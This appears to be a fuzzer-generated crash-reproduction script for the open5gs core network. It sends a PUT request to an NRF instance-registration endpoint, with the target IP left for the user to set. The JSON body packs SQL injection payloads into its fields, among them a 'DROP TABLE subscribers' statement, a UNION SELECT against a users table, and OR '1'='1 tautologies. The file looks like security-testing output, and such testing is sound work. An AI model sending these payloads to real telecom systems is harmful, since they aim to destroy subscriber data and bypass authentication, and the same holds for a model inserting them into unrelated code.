#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (info)
# Detected: Sat May  9 02:19:02 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/PCF-fuzz-2002'
body = b'{"nfInstanceId": "\'; DROP TABLE subscribers; --", "nfType": "1\' UNION SELECT * FROM users--", "nfStatus": "\' OR \'1\'=\'1", "ipv4Addresses": ["172.23.0.20"], "fqdn": "\' OR \'1\'=\'1", "priority": 1, "capacity": 65535, "load": 65535, "nfServices": [], "grant_type": "\' OR \'1\'=\'1"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
